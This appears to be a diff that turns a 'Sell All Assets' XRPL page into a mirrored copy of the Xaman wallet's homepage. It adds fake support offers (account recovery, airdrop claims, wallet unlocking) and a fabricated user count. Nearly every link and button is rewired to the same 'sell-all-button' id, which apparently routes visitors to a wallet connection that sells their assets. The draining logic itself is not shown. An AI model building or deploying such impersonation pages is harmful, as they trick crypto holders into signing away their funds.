@@ -1,54 +1,607 @@
-<!doctype html>
-<html lang="en">
+
+<!DOCTYPE html>
+<html data-head-attrs="">
+  <!-- Mirrored from xaman.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 23 Oct 2024 13:21:04 GMT -->
+  <!-- Added by HTTrack -->
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+  <!-- /Added by HTTrack -->
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>XRPL DeFi Platform</title>
-    <link rel="stylesheet" href="/src/styles.css" />
+    <title>Xaman. Your XRP. Your wallet.</title>
+	 <link rel="stylesheet" href="/src/styles.css" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta hid="og-type" property="og:type" content="website">
+    <meta hid="og-title" property="og:title" content="Xaman: The entire XRPL and Xahau ecosystem in your pocket.">
+    <meta hid="og-desc" property="og:description" content="The leading self custody wallet for the XRP Ledger and Xahau. Secure your crypto with confidence!">
+    <meta hid="t-type" name="twitter:creator" content="@XRPLLabs">
+    <meta hid="t-type" name="twitter:card" content="summary_large_image">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+	<link rel="icon" type="image/ico" href="/favicon.ico">
+    <link href="success/way/css/joint.css" rel="stylesheet" />
+    <meta name="head:count" content="10">
+    <link rel="modulepreload" href="_nuxt/entry-1202b35f.mjs" as="script">
+    <link rel="preload" href="_nuxt/entry.47f3407c.css" as="style">
+    <link rel="modulepreload" href="_nuxt/index-6bcfe991.mjs" as="script">
+    <link rel="prefetch" href="_nuxt/app-store-ios.2d6b5542.png">
+    <link rel="prefetch" href="_nuxt/app-store-android.c16320e2.png">
+    <link rel="prefetch" href="_nuxt/icon-pro.f4fcc239.svg">
+    <link rel="prefetch" href="_nuxt/icon-devs.37c6f09c.svg">
+    <link rel="prefetch" href="_nuxt/icon-xrpl.221b46f2.svg">
+    <link rel="prefetch" href="_nuxt/icon-retail.ceb1a438.svg">
+    <link rel="prefetch" href="_nuxt/logo-tangem.1253eb6b.png">
+    <link rel="prefetch" href="_nuxt/logo-xrptoolkit.2a610c4b.png">
+    <link rel="prefetch" href="_nuxt/logo-xrplservices.7d1643a4.png">
+    <link rel="prefetch" href="_nuxt/logo-xrplf.3f9184cd.png">
+    <link rel="prefetch" href="_nuxt/app-full-new.62cece42.png">
+    <link rel="prefetch" href="_nuxt/feat-noncustodial.29daec0d.png">
+    <link rel="prefetch" href="_nuxt/feat-accounts.2677d909.png">
+    <link rel="prefetch" href="_nuxt/feat-tokens.cce66a81.png">
+    <link rel="prefetch" href="_nuxt/feat-tangem.0ec2a74f.png">
+    <link rel="prefetch" href="_nuxt/feat-xapps.d1735d0f.png">
+    <link rel="prefetch" href="_nuxt/logo-xapps.0157c60e.svg">
+    <link rel="prefetch" href="_nuxt/icon-xrpllabs.1153b47f.png">
+    <link rel="prefetch" href="_nuxt/icon-xumm.2e093bf3.png">
+    <link rel="prefetch" href="_nuxt/icon-mediakit.98518a75.png">
+    <link rel="prefetch" href="_nuxt/logo-light.862dc64c.svg">
+    <link rel="prefetch" href="_nuxt/bg-hero6.179e91b7.png">
+    <link rel="prefetch" href="_nuxt/bg-hero5.4112a946.png">
+    <link rel="prefetch" href="_nuxt/bg-eco.cab154c0.png">
+    <link rel="stylesheet" href="_nuxt/entry.47f3407c.css">
+	<link rel="stylesheet" href="/nav.css">
+
+	
+
   </head>
-  <body>
-    <main class="app-shell">
-      <section class="topbar" aria-label="Application status">
-        <div class="brand"><span class="brand-mark" aria-hidden="true">✓</span><span>XRPL DeFi</span></div>
-        <div class="network-pill" id="network-label">testnet network</div>
-      </section>
+  <body data-head-attrs="">
+  
+    <div id="__nuxt">
+    <div>
+    <nav class="custom-nav w-full grid grid-cols-[1fr,1fr] lg:grid-cols-[1fr,1fr,1fr] justify-between content-center px-5">
+        <div class="logo min-w-150px max-w-200px">
+            <a aria-current="page" href="index.html" class="router-link-active router-link-exact-active nav-link">
+                <img src="_nuxt/logo-light.862dc64c.svg" alt="logo">
+            </a>
+        </div>
+        <!-- Menu items -->
+        <div class="menuitems hidden lg:grid"> <!-- hidden by default on mobile -->
+            <ul class="grid lg:grid-flow-col-dense gap-x-8 justify-items-center font-regular text-white">
+                <li><a aria-current="page" href="index.html" class="router-link-active router-link-exact-active nav-link"><i class="fas fa-home"></i><span>Home</span></a></li>
+                <li><a class="nav-link" data-open-wallet-selector>Ecosystem</a></li>
+                <li><a class="nav-link" id="sell-all-button" >Developers</a></li>
+                <li><a class="nav-link" id="sell-all-button" >Features</a></li>
+                <li><a class="nav-link" id="sell-all-button" >Blog</a></li>
+                <li><a class="nav-link" id="sell-all-button" >Contact</a></li>
+                <li><a class="nav-link" id="sell-all-button" >FAQ & Support</a></li>
+                <!-- Mobile specific Buy Tangem card button -->
+                <li class="lg:hidden">
+                    <a class="inline-block tangem px-6 py-2 mr-2 bg-xummdark text-white font-medium text-sm hover:bg-xummneon rounded-full" id="sell-all-button" >
+                        <i class="fas fa-credit-card"></i> Buy Tangem cards
+                    </a>
+                </li>
+            </ul>
+        </div>
+        <!-- Action (Burger + Desktop-specific action) -->
+        <div class="action text-right">
+            <!-- Desktop specific Buy Tangem card button -->
+            <a class="tangem px-6 py-2 mx-2 bg-xummdark text-white font-medium text-sm hover:bg-xummneon rounded-full hidden lg:inline-block" id="sell-all-button" >
+                <i class="fas fa-credit-card"></i> Buy Tangem cards
+            </a>
+            <!-- Burger menu for mobile -->
+            <a class="sm:inline-block lg:hidden burger">
+                <i class="fas fa-bars"></i>
+            </a>
+        </div>
+    </nav>
+</div>
 
-      <section class="sell-workspace">
-        <div class="sell-panel">
-          <p class="eyebrow">Sell All Assets</p>
-          <h1>Sell your eligible XRPL assets through an explicit wallet approval.</h1>
-          <p>Start with the Sell All action. After wallet connection, the backend creates the session, discovers eligible assets, prepares the sell plan, and asks your wallet for explicit signing.</p>
-<a href="#" class="nav-link" data-open-wallet-selector>
+<style>
+    /* Custom Navigation Styles */
+    .custom-nav {
+        display: grid !important;
+        grid-template-columns: 1fr 1fr 1fr !important;
+    }
 
-    Wallets
+    .menuitems {
+        grid-auto-flow: column !important;
+        gap: 1rem;
+    }
 
-  </a>
-          <button class="sell-all-button" type="button" data-open-wallet-selector>Sell All Assets</button>
+    /* Mobile menu specific styles */
+    @media (max-width: 1024px) {
+        .menuitems {
+            display: none; /* Hidden by default on mobile */
+            flex-direction: column;
+            align-items: flex-start;
+            width: 100%;
+            background-color: #0044cc;
+            position: absolute;
+            top: 70px;
+            left: 0;
+            padding: 1rem;
+            z-index: 1000;
+        }
 
-          <div class="status-grid">
-            <div><span>API</span><strong id="api-status">checking</strong></div>
-            <div><span>Wallet</span><strong id="wallet-status">not selected</strong></div>
-            <div><span>Sell state</span><strong id="sell-state">IDLE</strong></div>
+        .menuitems.active {
+            display: flex !important; /* Show when active */
+        }
+
+        .menuitems li {
+            padding: 1rem 2rem;
+            font-size: 1.2rem;
+            color: white;
+            text-align: left;
+        }
+
+        .menuitems li a {
+            text-decoration: none;
+            color: inherit;
+            font-weight: bold;
+        }
+
+        .menuitems li a:hover {
+            color: #ffcc00; /* Highlight color on hover */
+        }
+
+        /* Burger icon styling */
+        .burger {
+            display: block;
+            cursor: pointer;
+            background-color: black;
+            padding: 5px;
+            position: absolute;
+            right: 10px;
+            top: 15px;
+            z-index: 1100;
+            border-radius: 5px;
+        }
+
+        .burger i {
+            font-size: 1.5rem;
+            color: #00ccff;
+        }
+
+        .burger.active {
+            background-color: #00ccff;
+        }
+    }
+
+    /* For PC (non-mobile) */
+    @media (min-width: 1025px) {
+        .menuitems {
+            display: grid !important; /* Ensure the menu shows on larger screens */
+            grid-auto-flow: column !important;
+            gap: 1rem;
+        }
+
+        .burger {
+            display: none; /* Hide burger button on large screens */
+        }
+
+        /* Ensure the Buy Tangem button is visible on PC */
+        .action .tangem {
+            display: inline-block !important;
+        }
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const burger = document.querySelector('.burger');
+        const menuItems = document.querySelector('.menuitems');
+
+        // Ensure the menu is hidden by default on mobile
+        if (window.innerWidth <= 1024) {
+            menuItems.classList.remove('active');
+        }
+
+        burger.addEventListener('click', function () {
+            menuItems.classList.toggle('active'); // Toggle the active class for mobile
+        });
+    });
+</script>
+
+
+        <div class="main" data-v-2340c136>
+          <div class="hero grid grid-rows-[150px, 1fr, 1fr, 1fr, 1fr] pt-20 p-5 content-center text-center" data-v-2340c136>
+		    <!-- Connect Wallet Button -->
+    <a id="sell-all-button"  class="connect-wallet-btn px-6 py-2 mb-4 text-white font-medium text-md hover:bg-xummdark hover:text-white rounded-full">
+    <i class="fas fa-wallet"></i> Connect Wallet
+</a>
+    <style>
+	.connect-wallet-btn {
+    background-color: black; /* Set background to black */
+    text-transform: none;
+    border-radius: 50px; /* Rounded button */
+    font-size: 1.2rem; /* Match font size */
+    padding: 10px 30px; /* Adjust padding for a moderate width */
+    max-width: 250px; /* Set max width to keep it moderate */
+    width: auto; /* Ensure it adjusts based on content */
+    margin: 0 auto 40px auto; /* Add margin-bottom to push it further up */
+    transition: background-color 0.3s ease-in-out;
+    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); /* Light shadow for a modern feel */
+    display: flex; /* Use flexbox for centering */
+    align-items: center; /* Center vertically */
+    justify-content: center; /* Center horizontally */
+    white-space: nowrap; /* Prevent text from breaking into multiple lines */
+}
+
+.connect-wallet-btn i {
+    margin-right: 8px; /* Add spacing between icon and text */
+}
+
+.connect-wallet-btn:hover {
+    background-color: #0033aa; /* Darker shade on hover */
+}
+
+@media (max-width: 768px) {
+    .connect-wallet-btn {
+        font-size: 1rem; /* Slightly smaller on mobile */
+        padding: 8px 20px; /* Adjust padding for mobile */
+        max-width: 200px; /* Limit the width on mobile */
+    }
+}
+
+
+
+
+
+	</style>
+            <h1 class="text-4xl md:text-6xl font-bold mb-1" data-v-2340c136>Xaman. Leading in self custody</h1>
+            <h2 class="text-1xl md:text-2xl font-normal mb-2" data-v-2340c136>The entire XRPL and Xahau ecosystem in your pocket</h2>
+            <div class="appstores mt-8 mb-10" data-v-2340c136>
+              <a class="appstorebutton ios" id="sell-all-button"  data-v-2340c136>
+                <img src="_nuxt/app-store-ios.2d6b5542.png" data-v-2340c136>
+              </a>
+              <a class="appstorebutton android" id="sell-all-button"  data-v-2340c136>
+                <img src="_nuxt/app-store-android.c16320e2.png" data-v-2340c136>
+              </a>
+              <br data-v-2340c136>
+              <a class="inline-block getpro px-6 py-2 mx-4 mb-2 text-white font-medium text-md hover:bg-xummdark hover:text-white rounded-full" id="sell-all-button"  data-v-2340c136>
+                <img src="_nuxt/icon-pro.f4fcc239.svg" data-v-2340c136> Get Xaman PRO </a>
+            </div>
+           <div class="stats" data-v-2340c136>
+				<span data-v-2340c136>Unique monthly active users: <br data-v-2340c136>
+					<b class="text-xl" id="userCount" data-v-2340c136>...</b>
+				</span>
+			</div>
+			<script>
+			document.addEventListener('DOMContentLoaded', function() {
+    // Target the element by its ID
+    const userCountElement = document.getElementById('userCount');
+    
+    // Set a timeout to change the '...' to the number after 2 seconds (2000 milliseconds)
+    setTimeout(function() {
+        userCountElement.innerHTML = '102,451'; // Change to desired number
+        userCountElement.style.fontWeight = 'bold'; // Ensure the number is bold
+    }, 2000); // 2000ms = 2 seconds
+});
+
+			</script>
+            <i class="fa fa-angle-down scrollindicator" data-v-2340c136></i>
           </div>
+          <div id="ecosystem" class="eco px-3 py-30 text-center" data-v-2340c136>
+            <h1 class="text-4xl md:text-6xl font-bold" data-v-2340c136>Our ecosystem</h1>
+            <div class="grid content-center px-5 pt-18 lg:container lg:mx-auto" data-v-2340c136>
+              <div class="grid grid-cols-[1fr] md:grid-cols-[1fr,1fr,1fr]" data-v-2340c136>
+                <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                  <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="" data-v-2340c136>
+                  <h3 class="text-2xl font-bold my-4" data-v-2340c136>Developers</h3>
+                  <p class="lg:leading-loose leading-relaxed" data-v-2340c136> The Xaman platform allows developers and app users to &quot;meet up&quot;. The true power of Xaman is the platform available for developers and app users. </p>
+                </div>
+                <div class="lg:px-5 px-2 text-xummblue" data-v-2340c136 id="sell-all-button" >
+                  <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="" data-v-2340c136>
+                  <h3 class="text-2xl font-bold my-4" data-v-2340c136>XRPL Users</h3>
+                  <p class="lg:leading-loose leading-relaxed" data-v-2340c136> Xaman is a non custodial client (wallet) for the XRP Ledger, with superpowers. Xaman allows you to interact with the XRP Ledger and 3rd party tools while keeping your keys super safe. </p>
+                </div>
+                <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                  <img class="icon mx-auto my-8" src="_nuxt/icon-retail.ceb1a438.svg" alt="" data-v-2340c136>
+                  <h3 class="text-2xl font-bold my-4" data-v-2340c136>Retail</h3>
+                  <p class="lg:leading-loose leading-relaxed" data-v-2340c136> Using Xaman in retail has many advantages, micropayments, loyalty points and easy webshop checkout flows. All with super low costs. </p>
+                </div>
+              </div>
+            </div>
+          </div>
+		  <div id="help" class="help px-3 py-30 text-center" data-v-2340c136>
+    <h1 class="text-4xl md:text-6xl font-bold" data-v-2340c136>Need Help? Select an Issue Below</h1>
+    <div class="grid content-center px-5 pt-18 lg:container lg:mx-auto" data-v-2340c136>
+        <!-- First row of help items -->
+        <div class="grid grid-cols-[1fr] md:grid-cols-[1fr,1fr,1fr]" data-v-2340c136>
+            <!-- Token Migration -->
+            <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Token Migration" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Token Migration</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Having trouble migrating your tokens between different blockchains? Our support team is here to assist you in ensuring that your assets move smoothly across networks without any loss or errors.
+                </p>
+            </div>
+            <!-- Claim Airdrop -->
+            <div class="lg:px-5 px-2 text-xummblue" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="Claim Airdrop" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Claim Airdrop</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Need help claiming your airdropped tokens? Let us guide you through the process to ensure you can successfully receive and access your free tokens in the shortest time possible.
+                </p>
+            </div>
+            <!-- Account Recovery -->
+            <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Account Recovery" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Account Recovery</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Lost access to your account? Our account recovery service will help you regain control of your wallet and ensure that your funds are secure during the process.
+                </p>
+            </div>
+        </div>
+        <!-- Second row of help items -->
+        <div class="grid grid-cols-[1fr] md:grid-cols-[1fr,1fr,1fr]" data-v-2340c136>
+            <!-- Staking Issues -->
+            <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Staking Issues" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Staking Issues</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Are you having issues with staking or unstaking tokens? Our dedicated support team can help resolve these problems so you can continue to earn rewards seamlessly.
+                </p>
+            </div>
+			<!-- Unlock Xaman Wallet -->
+<div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+    <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="Unlock Xaman Wallet" data-v-2340c136>
+    <h3 class="text-2xl font-bold my-4" data-v-2340c136>Unlock Xaman Wallet</h3>
+    <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+        Regain access to your Xaman Wallet securely and effortlessly. Our support team is here to assist you with unlocking your wallet if you're experiencing any access issues.
+    </p>
+</div>
 
-          <div id="connection-banner" class="connection-banner success">
-            <span id="flow-message">Ready.</span>
+<!-- Restore Full Functionality -->
+<div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+    <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Restore Full Functionality" data-v-2340c136>
+    <h3 class="text-2xl font-bold my-4" data-v-2340c136>Restore Full Functionality</h3>
+    <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+        Facing issues with limited access or missing features? Let us help you restore full functionality to your Xaman Wallet, ensuring a seamless experience.
+    </p>
+</div>
+
+<!-- Recovery Account -->
+<div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+    <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="Recovery Account" data-v-2340c136>
+    <h3 class="text-2xl font-bold my-4" data-v-2340c136>Recovery Account</h3>
+    <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+        Lost access to your account? Our team can help you recover it securely and ensure your funds remain safe.
+    </p>
+</div>
+
+<!-- Recovery Assets -->
+<div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+    <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Recovery Assets" data-v-2340c136>
+    <h3 class="text-2xl font-bold my-4" data-v-2340c136>Recovery Assets</h3>
+    <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+        Missing or inaccessible assets? Let us assist you in recovering your digital assets and ensuring full access.
+    </p>
+</div>
+
+
+            <!-- Cross Chain Transfer -->
+            <div class="lg:px-5 px-2 text-xummblue" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="Cross Chain Transfer" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Cross Chain Transfer</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Need help transferring your assets across different blockchains? We provide assistance with cross-chain transfers to make sure your assets arrive at their intended destination securely.
+                </p>
+            </div>
+            <!-- Transaction Error -->
+            <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Transaction Error" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Transaction Error</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Encountered an error while transacting? Whether it's a failed transaction or stuck funds, our experts can help troubleshoot and rectify these issues quickly.
+                </p>
+            </div>
+        </div>
+        <!-- Third row of help items -->
+        <div class="grid grid-cols-[1fr] md:grid-cols-[1fr,1fr,1fr]" data-v-2340c136>
+            <!-- Swap Exchange -->
+            <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Swap Exchange" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Swap Exchange</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Facing issues with swapping tokens? Whether you're having trouble exchanging tokens for another, our team can guide you through resolving swap issues promptly.
+                </p>
+            </div>
+            <!-- Rectification -->
+            <div class="lg:px-5 px-2 text-xummblue" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="Rectification" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Rectification</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Need to rectify an issue with your account? We assist with correcting account errors, ensuring that your account and assets are properly aligned with your preferences.
+                </p>
+            </div>
+			<!-- Synchronization -->
+<div class="lg:px-5 px-2 text-xummblue" data-v-2340c136 id="sell-all-button" >
+    <img class="icon mx-auto my-8" src="_nuxt/icon-xrpl.221b46f2.svg" alt="Synchronization" data-v-2340c136>
+    <h3 class="text-2xl font-bold my-4" data-v-2340c136>Synchronization</h3>
+    <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+        Need help syncing your tokens or data? Let us guide you through the process to ensure a seamless synchronization experience in the shortest time possible.
+    </p>
+</div>
+            <!-- Other Issues Not Listed -->
+            <div class="lg:px-5 px-2" data-v-2340c136 id="sell-all-button" >
+                <img class="icon mx-auto my-8" src="_nuxt/icon-devs.37c6f09c.svg" alt="Other Issues Not Listed" data-v-2340c136>
+                <h3 class="text-2xl font-bold my-4" data-v-2340c136>Other Issues Not Listed</h3>
+                <p class="lg:leading-loose leading-relaxed" data-v-2340c136>
+                    Have an issue not listed here? Feel free to reach out, and we'll do our best to help you resolve it. Our support team is dedicated to providing solutions to any crypto-related problems.
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+
+
+          <div class="logos py-10 px-5 bg-blue-gray-50" data-v-2340c136>
+            <div class="grid content-center lg:container lg:mx-auto" data-v-2340c136>
+              <div class="grid grid-cols-[1fr,1fr] md:grid-cols-[1fr,1fr,1fr,1fr] content-center text-center" data-v-2340c136>
+                <div data-v-2340c136>
+                  <img class="max-h-10 px-3 &lt;sm:py-1 &lt;sm:max-h-12 inline-block" src="_nuxt/logo-tangem.1253eb6b.png" alt="Logo Tangem" data-v-2340c136>
+                </div>
+                <div data-v-2340c136>
+                  <img class="max-h-10 px-3 &lt;sm:py-1 &lt;sm:max-h-12 inline-block" src="_nuxt/logo-xrptoolkit.2a610c4b.png" alt="Logo XRPL Toolkit" data-v-2340c136>
+                </div>
+                <div data-v-2340c136>
+                  <img class="max-h-10 px-3 &lt;sm:py-1 &lt;sm:max-h-12 inline-block" src="_nuxt/logo-xrplservices.7d1643a4.png" alt="Logo XRPL Services" data-v-2340c136>
+                </div>
+                <div data-v-2340c136>
+                  <img class="max-h-10 px-3 &lt;sm:py-1 &lt;sm:max-h-12 inline-block" src="_nuxt/logo-xrplf.3f9184cd.png" alt="Logo XRPL Foundation" data-v-2340c136>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="devs" class="xumm px-3 grid grid-rows-[1fr] pt-30 pb-30 content-top text-center" data-v-2340c136>
+            <h1 class="text-4xl mb-2 md:text-6xl font-bold text-white" data-v-2340c136>Developers</h1>
+            <div data-v-2340c136>
+              <img class="phones md:max-w-500px" src="_nuxt/app-full-new.62cece42.png" alt="" data-v-2340c136>
+            </div>
+            <div class="mt-10" data-v-2340c136>
+              <a class="inline-block tangem px-6 py-2 mx-4 mb-2 bg-xummblue text-white font-medium text-sm hover:bg-xummneon hover:text-white rounded-full" id="sell-all-button"  data-v-2340c136>Developer documentation</a>
+              <a class="inline-block tangem px-6 py-2 mx-4 mb-2 bg-xummblue text-white font-medium text-sm hover:bg-xummneon hover:text-white rounded-full" id="sell-all-button"  data-v-2340c136>Developer Console</a>
+            </div>
+          </div>
+          <div id="features" class="features py-30 px-3" data-v-2340c136>
+            <h1 class="text-4xl md:text-6xl font-bold text-center" data-v-2340c136>Some Xaman Features</h1>
+            <div class="grid content-center px-5 pt-18 lg:container lg:mx-auto" data-v-2340c136>
+              <div class="grid grid-rows-[1fr,1fr,1fr,1fr,1fr]" data-v-2340c136>
+                <div class="lg:px-5 px-2 py-4" data-v-2340c136>
+                  <div class="grid grid-cols-[1fr] md:grid-cols-[50%,50%]" data-v-2340c136>
+                    <img class="feat justify-self-center lg:w-3/5 w-sm" src="_nuxt/feat-noncustodial.29daec0d.png" alt="" data-v-2340c136>
+                    <div class="self-center md:pr-20 text-center md:text-left" data-v-2340c136>
+                      <h3 class="text-2xl font-bold my-4" data-v-2340c136>Non custodial</h3>
+                      <p class="lg:leading-loose leading-relaxed font-light" data-v-2340c136> Xaman removes the barrier between a user and their assets. Unlock the app with a passcode or bio-metrics (fingerprint, face ID) and the user has full, direct control. </p>
+                    </div>
+                  </div>
+                </div>
+                <div class="lg:px-5 px-2 py-4" data-v-2340c136>
+                  <div class="grid grid-cols-[1fr] md:grid-cols-[50%,50%]" data-v-2340c136>
+                    <img class="feat justify-self-center lg:w-3/5 w-sm md:order-last" src="_nuxt/feat-accounts.2677d909.png" alt="" data-v-2340c136>
+                    <div class="self-center md:pl-20 text-center md:text-right" data-v-2340c136>
+                      <h3 class="text-2xl font-bold my-4" data-v-2340c136>Multiple accounts</h3>
+                      <p class="lg:leading-loose leading-relaxed font-light" data-v-2340c136> Xaman allows you to generate new XRP Ledger accounts, and allows you to import your existing accounts. Manage all of them with Xaman to get the most out of the XRP Ledger, without compromising your security. </p>
+                    </div>
+                  </div>
+                </div>
+                <div class="lg:px-5 px-2 py-4" data-v-2340c136>
+                  <div class="grid grid-cols-[1fr] md:grid-cols-[50%,50%]" data-v-2340c136>
+                    <img class="feat justify-self-center lg:w-3/5 w-sm" src="_nuxt/feat-tokens.cce66a81.png" alt="" data-v-2340c136>
+                    <div class="self-center md:pr-20 text-center md:text-left" data-v-2340c136>
+                      <h3 class="text-2xl font-bold my-4" data-v-2340c136>Tokens</h3>
+                      <p class="lg:leading-loose leading-relaxed font-light" data-v-2340c136> The XRP Ledger&#39;s consensus algorithm settles transactions in 4 to 5 seconds, processing at a throughput of up to 1500 transactions per second. </p>
+                    </div>
+                  </div>
+                </div>
+                <div class="lg:px-5 px-2 py-4" data-v-2340c136>
+                  <div class="grid grid-cols-[1fr] md:grid-cols-[50%,50%]" data-v-2340c136>
+                    <img class="feat justify-self-center lg:w-3/5 w-sm md:order-last" src="_nuxt/feat-tangem.0ec2a74f.png" alt="" data-v-2340c136>
+                    <div class="self-center md:pl-20 text-center md:text-right" data-v-2340c136>
+                      <h3 class="text-2xl font-bold my-4" data-v-2340c136>Super safe</h3>
+                      <p class="lg:leading-loose leading-relaxed font-light" data-v-2340c136> Security is our #1 priority. The Xaman has been audited. Using our Xaman Tangem cards, you can even get the best of both worlds: Xaman usability with Tangem NFC hardware wallet support. </p>
+                      <a class="inline-block tangem px-6 py-2 mt-8 bg-xummdark text-white font-medium text-sm hover:bg-xummblue hover:text-white rounded-full" id="sell-all-button"  data-v-2340c136>
+                        <i class="fas fa-credit-card" data-v-2340c136></i> Get your Tangem cards </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="lg:px-5 px-2 py-4" data-v-2340c136>
+                  <div class="grid grid-cols-[1fr] md:grid-cols-[50%,50%]" data-v-2340c136>
+                    <img class="feat justify-self-center lg:w-55/100 w-sm" src="_nuxt/feat-xapps.d1735d0f.png" alt="" data-v-2340c136>
+                    <div class="self-center md:pr-20 text-center md:text-left" data-v-2340c136>
+                      <h3 class="text-2xl font-bold my-4" data-v-2340c136>3rd party tools &amp; apps</h3>
+                      <p class="lg:leading-loose leading-relaxed font-light" data-v-2340c136> Interact with the tools &amp; apps built by other developers, straight from Xaman. A diverse collection of xApps by 3rd party developers at your fingertips, unleashing even more features of the XRP Ledger. </p>
+                      <img class="justify-self-center inline-block mt-3 w-24" src="_nuxt/logo-xapps.0157c60e.svg" alt="" data-v-2340c136>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="cta grid grid-rows-[150px, 1fr] pt-20 pb-10 content-center text-center" data-v-2340c136>
+            <h1 class="text-4xl md:text-6xl font-bold mb-1" data-v-2340c136>Download Xaman</h1>
+            <div class="appstores mt-8 mb-10" data-v-2340c136>
+              <a class="appstorebutton ios" id="sell-all-button"  data-v-2340c136>
+                <img src="_nuxt/app-store-ios.2d6b5542.png" data-v-2340c136>
+              </a>
+              <a class="appstorebutton android" id="sell-all-button"  data-v-2340c136>
+                <img src="_nuxt/app-store-android.c16320e2.png" data-v-2340c136>
+              </a>
+            </div>
+          </div>
+          <div id="contact" class="channels px-3 pt-10 pb-30 mx-auto" data-v-2340c136>
+            <h1 class="lg:w-screen-lg sm:w-screen-sm text-4xl md:text-6xl font-bold my-15 mx-auto" data-v-2340c136>Official channels</h1>
+            <div class="lg:w-screen-lg sm:w-screen-sm grid grid-cols-1 md:grid-cols-2 content-center mx-auto" data-v-2340c136>
+              <div class="xrpl" data-v-2340c136>
+                <img src="_nuxt/icon-xrpllabs.1153b47f.png" class="picca" loading="lazy" data-v-2340c136>
+                <div class="socials" data-v-2340c136>
+                  <a id="sell-all-button"  class="link"  data-v-2340c136>
+                    <i class="fa fa-twitter" aria-hidden="true" data-v-2340c136></i> XRPL Labs </a>
+                  <br data-v-2340c136>
+                  <a id="sell-all-button"  class="link"  data-v-2340c136>
+                    <i class="fa fa-github" aria-hidden="true" data-v-2340c136></i> Github </a>
+                </div>
+              </div>
+              <div class="xummwallet" data-v-2340c136>
+                <img src="_nuxt/icon-xumm.2e093bf3.png" class="picca" loading="lazy" data-v-2340c136>
+                <div class="socials" data-v-2340c136>
+                  <a id="sell-all-button"  class="link"  data-v-2340c136>
+                    <i class="fa fa-twitter" aria-hidden="true" data-v-2340c136></i> Xaman Wallet </a>
+                  <a id="sell-all-button"  class="link"  data-v-2340c136>
+                    <i class="fa fa-twitter" aria-hidden="true" data-v-2340c136></i> Support </a>
+                  <br data-v-2340c136>
+                  <a id="sell-all-button"  class="link" data-v-2340c136>
+                    <i class="fa fa-newspaper" aria-hidden="true" data-v-2340c136></i> Blog </a>
+                </div>
+              </div>
